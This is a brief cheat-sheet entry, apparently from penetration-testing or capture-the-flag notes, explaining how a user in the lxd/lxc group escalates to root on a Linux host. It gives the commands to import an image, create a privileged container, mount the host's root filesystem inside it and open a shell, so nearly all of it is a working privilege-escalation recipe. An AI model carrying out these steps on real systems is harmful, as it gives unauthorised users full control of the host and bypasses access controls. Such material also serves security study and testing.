To abuse Linux Containers or Linux Daemon, We have to see if our id has lxd/lxc in it
```id```
We can import a Container or create one. Admins often use templates for this which has little to no security.
```lxc import image-name```
After verifying if the image has been imported correctly then configure the image.
```lxc init image-name privesc -c security.privileged=true```
```lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true```
This flag disables all isolation features that allow us to act on the host
Start the Container and then execute ```/bin/bash```
Now mount the root directory in it.
